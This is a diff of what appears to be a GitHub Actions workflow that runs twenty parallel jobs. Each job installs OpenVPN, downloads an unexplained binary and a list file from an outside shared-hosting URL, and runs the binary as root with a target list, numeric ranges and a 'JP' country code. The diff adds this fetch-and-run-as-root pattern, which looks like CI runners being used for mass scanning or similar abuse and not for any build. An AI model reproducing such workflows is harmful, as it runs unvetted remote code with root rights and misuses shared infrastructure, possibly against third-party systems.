@@ -6,380 +6,380 @@ jobs:
   clone-and-run-0:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-1:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-2:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-3:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-4:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-5:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-6:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-7:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-8:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-9:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-10:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-11:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-12:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-13:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-14:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-15:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-16:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-17:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-18:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
   clone-and-run-19:
     runs-on: ubuntu-latest
     steps:
-    - name: Install OpenVPN
-    run: |
-        sudo apt-get update
-        sudo apt-get install -y openvpn
-	
-    - name: Download main
-    run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
+      - name: Install OpenVPN
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openvpn
 
-    - name: Download list.txt
-    run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
+      - name: Download main
+        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main
 
-    - name: Make main executable
-    run: chmod +x main
+      - name: Download list.txt
+        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt
 
-    - name: Run main
-        run: sudo ./main list.txt 5000 19000
+      - name: Make main executable
+        run: chmod +x main
+
+      - name: Run main
+        run: sudo ./main list.txt 5000 12000 JP
